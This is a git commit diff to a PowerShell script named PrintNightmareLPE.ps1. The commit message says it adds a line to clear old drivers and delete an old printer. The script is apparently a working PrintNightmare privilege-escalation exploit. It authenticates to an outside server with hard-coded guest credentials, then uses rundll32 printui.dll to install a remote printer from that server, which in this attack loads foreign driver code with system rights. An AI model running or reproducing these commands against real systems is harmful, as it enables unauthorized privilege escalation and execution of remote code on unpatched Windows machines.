1502d3c2c9f50c6f16000b09fbf390598d583fb1
Dvir S <dviros@me.com>
2021-07-29 18:33:02 +0300

    Update
    Added a line to clear the drivers and delete the old printer

--- PrintNightmareLPE.ps1
+++ PrintNightmareLPE.ps1
@@ -1,2 +1,3 @@
 net use \\printnightmare.gentilkiwi.com\IPC$ /user:"20.188.56.147\gentilguest" password
+rundll32 printui.dll,PrintUIEntry /dd /dn /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"
 rundll32 printui.dll,PrintUIEntry /in /q /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"
